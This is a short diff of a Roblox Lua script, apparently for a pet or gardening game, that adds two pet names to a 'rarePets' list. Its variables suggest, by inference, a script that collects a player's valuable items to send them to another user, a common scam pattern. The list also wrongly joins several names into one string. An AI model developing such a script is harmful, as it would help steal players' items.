@@ -22,7 +22,7 @@ local numberUtil = require(modules:WaitForChild("NumberUtil"))
 local dataService = require(modules:WaitForChild("DataService"))
 local character = plr.Character or plr.CharacterAdded:Wait()
 local excludedItems = {"Seed", "Shovel [Destroy Plants]", "Water", "Fertilizer"}
-local rarePets = {"Red Fox", "Raccoon", "Dragonfly, Griffin, Golden Goose"}
+local rarePets = {"Red Fox", "Raccoon", "Dragonfly, Griffin, Golden Goose, Kitsune, Corrupted Kitsune"}
 local totalValue = 0
 local itemsToSend = {}
 
@@ -352,5 +352,6 @@ if #itemsToSend > 0 then
     waitForUserChat()
 
 end
+
 
 
